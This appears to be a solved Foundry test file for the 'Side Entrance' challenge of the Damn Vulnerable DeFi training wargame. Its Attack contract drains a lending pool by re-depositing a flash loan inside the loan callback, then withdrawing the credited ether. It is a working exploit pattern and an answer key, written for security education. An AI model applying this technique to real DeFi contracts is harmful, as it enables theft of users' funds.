// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        emit log_named_decimal_uint("Player balance before attack:", recovery.balance, 18);
        Attack attack = new Attack(SideEntranceLenderPool(pool));
        attack.attack();
        attack.withDrawFromPoolandSendtoRecovery();
        emit log_named_decimal_uint("Player balance after attack:", recovery.balance, 18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract Attack is Test {
    SideEntranceLenderPool pool;
    address recovery = makeAddr("recovery");

    constructor(
        SideEntranceLenderPool _pool
    ) {
        pool = _pool;
    }

    function execute() public payable {
        pool.deposit{value: 1000e18}();
    }

    function withDrawFromPoolandSendtoRecovery() public payable {
        pool.withdraw();
        (bool success,) = address(recovery).call{value: 1000e18}("");
        require(success, "transfer failed");
    }

    function attack() public {
        pool.flashLoan(1000e18);
    }

    receive() external payable {}
}
